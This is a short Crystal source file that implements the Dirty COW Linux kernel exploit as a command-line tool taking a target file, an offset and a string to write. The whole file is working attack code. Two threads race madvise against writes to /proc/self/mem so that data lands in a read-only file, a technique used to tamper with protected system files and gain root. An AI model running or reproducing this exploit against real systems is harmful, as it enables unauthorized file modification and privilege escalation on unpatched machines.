require "option_parser"

module Dirtycow
  dst = ""
  str = ""
  off = 0

  p = OptionParser.parse! do |parser|
    parser.banner = "Usage: dirtycow [options]"
    parser.on("-t PATH", "--target=PATH", "Target file path") { |t| dst = t }
    parser.on("-o VALUE", "--offset=VALUE", "Offset in target file") { |o| off = o.to_i }
    parser.on("-s STRING", "--string=STRING", "String to write in file at offset") { |s| str = s }
    parser.on("-h", "--help", "Show this help") { puts parser }
  end

  if dst.empty? || str.empty?
    puts p
    exit 1
  end

  # Open memory map of this process
  file = File.open(dst)
  mem = File.open("/proc/self/mem", mode = "r+")
  ptr = LibC.mmap(nil, file.size, LibC::PROT_READ, LibC::MAP_PRIVATE, file.fd, 0)
  chan = Channel(Nil).new(2)

  # Memory advise
  Thread.new do
    1000000.times do
      LibC.madvise(ptr, off + str.size, LibC::MADV_DONTNEED)
    end
    chan.send(nil)
  end

  # Memory write
  Thread.new do
    1000000.times do
      mem.seek(ptr.address + off, IO::Seek::Set)
      mem.puts(str)
    end
    chan.send(nil)
  end

  2.times { chan.receive }
end
